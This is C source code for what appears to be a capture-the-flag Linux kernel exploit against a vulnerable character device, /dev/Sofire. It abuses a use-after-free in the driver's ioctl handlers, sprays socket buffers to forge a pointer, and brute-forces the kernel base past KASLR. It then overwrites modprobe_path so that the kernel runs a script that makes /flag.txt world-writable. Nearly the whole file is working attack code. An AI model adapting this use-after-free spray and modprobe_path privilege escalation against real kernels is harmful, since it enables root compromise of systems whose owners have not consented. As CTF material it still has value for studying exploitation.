#include <fcntl.h>      /* open */
#include <unistd.h>     /* exit */
#include <sys/ioctl.h>  /* ioctl */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <linux/ioctl.h>
#include <linux/tty.h>
#include <sys/syscall.h>
#include <assert.h>
#include <sys/utsname.h>
#include <sys/stat.h>
#include <sys/types.h>

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <string.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/socket.h>
#include <sys/timerfd.h>

#define DEVICE_FILE_NAME "/dev/Sofire"
#define FREE 0x1337
#define ADD 0xdeadbeef
#define READ 0xcafebabe
#define WRITE 0xbabecafe

#define CHUNK_SIZE 0x100

typedef struct request{
    int idx;
    char buffer[CHUNK_SIZE];
} request;

int fd;

request req;

int free_nft(){
        return ioctl(fd, FREE, &req);
}

int add_nft(char* data){
        memcpy(req.buffer, data, CHUNK_SIZE);
        return ioctl(fd, ADD, &req);
}

int read_nft(int idx, char* out){
        int ans;
        req.idx = idx;
        ans = ioctl(fd, READ, &req);
        if(out != NULL){
                memcpy(out, req.buffer, CHUNK_SIZE);
        }
        return ans;
}

int write_nft(int idx, char* data){
        req.idx = idx;
        memcpy(req.buffer, data, CHUNK_SIZE);
        return ioctl(fd, WRITE, &req);
}

void hexdump(uint8_t* buf, int size) {
    for (int i = 0; i < size; i+=16) {
        printf("0x%02hhx| ", i);
        for (int j = 0; j < 16; j++)
            printf("%02hhx ", buf[i+j]);
        puts("");
    }
}

#define NUM_SOCKETS 4
#define NUM_SKBUFFS 128
#define SKB_SHARED_SIZE 320

#define SKBUFF_SIZE 512 - SKB_SHARED_SIZE
int ss[NUM_SOCKETS][2];
int spray_skbuff(void *buf, size_t size) {
  for (int i = 0; i < NUM_SOCKETS; i++) {
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (write(ss[i][0], buf, size) < 0) {
        perror("write");
        return -1;
      }
    }
  }
  return 0;
}

int free_skbuff(void *buf, size_t size) {
  for (int i = 0; i < NUM_SOCKETS; i++) {
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (read(ss[i][1], buf, size) < 0) {
        perror("read");
        return -1;
      }
    }
  }
  return 0;
}

void modprobe_hax()
{
    // Given modprobe_path is /home/user/w this will chmod /flag.txt 777
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/roooot");
    system("chmod +x /home/user/roooot");
    system("echo -ne '#!/bin/sh\nchmod 777 /flag.txt\n' > /home/user/w\n");
    system("chmod +x /home/user/w");
    system("/home/user/roooot");
    return;
}

int main(int argc, char *argv[])
{
        
        fd = open(DEVICE_FILE_NAME,0);
        if (fd < 0){
                puts("Device file not found.");
                exit(0);
        }  
        
        for (int i = 0; i < NUM_SOCKETS; i ++) {
                if(socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {
                perror("socketpair");
                exit(1);
                }
        }

        char buf[CHUNK_SIZE];
        uint64_t* fake_nft = calloc(8, 24);
        void* outbuf = calloc(1, 512);
        memset(buf, 0x41, CHUNK_SIZE);
        add_nft(buf);
        free_nft();

        read_nft(0, buf);
        uint64_t kbase;
        // KASLR only has 9 bits of entropy. Since copy_to_user is used to copy data from NFT to user(copy_to_user never crashes) we can just scan memory for kernel base.
        // Use socket buffer to fake an NFT pointer and then read nft idx 0 which is at fake pointer, and will attempt to copy text from fake pointer + 8.
        for(uint64_t i = 0; i < 512; i ++){
                fake_nft[0] = 0xffffffff80000000UL + (i << 21);
                printf("%p\n", fake_nft[0]);
                spray_skbuff(fake_nft, SKBUFF_SIZE);
                read_nft(1, buf);
                hexdump(buf, CHUNK_SIZE);
                free_skbuff(outbuf, SKBUFF_SIZE);
                // Actually read data
                if(buf[0] != 0x41){
                        kbase = fake_nft[0];
                        break;
                }
        }
        // Overwrite modprobe_path with /home/user/w and then do standard modprobe shenanigans
        uint64_t modprobe_path = kbase + 0x1851400;
        printf("Kernel base: %p\n", kbase);
        printf("Modprobe Path: %p\n", modprobe_path);

        fake_nft[0] = modprobe_path - 8;
        spray_skbuff(fake_nft, SKBUFF_SIZE);
        strcpy(buf, "/home/user/w");
        write_nft(1, buf);
        modprobe_hax();
}
